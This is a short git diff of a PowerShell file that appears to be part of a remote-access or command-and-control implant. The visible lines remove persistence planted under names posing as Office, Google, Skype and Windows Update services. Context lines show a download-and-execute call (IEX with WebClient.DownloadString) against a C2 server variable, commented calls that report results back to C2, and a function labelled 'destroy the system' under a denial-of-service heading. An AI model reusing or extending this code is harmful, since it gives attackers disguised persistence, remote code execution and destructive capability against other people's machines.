@@ -579,12 +579,12 @@ Function Invoke-Pnt {
 			Remove-Item -path "$env:userprofile\help.exe" -recurse
 			Remove-Item -path "$env:userprofile\AppData\http.exe" -recurse
 			# clean dnsspoof
-			# clean persistence (task, wmi, reg, startup)
+			# clean persistence (task, wmi, sc, reg, startup)
 			schtasks /delete /tn OfficeUpdates-Service /f 
 			schtasks /delete /tn GoogleUpdates-us /f
 			schtasks /delete SkypeUpdates-en /f
 			sc delete wuausvc
-			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\wuausvc.lnk" -recurse
+			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\wuausvc.bat" -recurse
 			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\wuausvc.ps1" -recurse
 			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Drivers.lnk" -recurse
 			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Drivers.ps1" -recurse
@@ -2281,6 +2281,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
 	#		$result = 'ok'
 	#		sendC2 $pc $result $id
 	#	}
+	
 	# Denial of Service (DDoS)
 		Function DestroyCommand { #!destroy the system
 			[CmdletBinding()] param( 
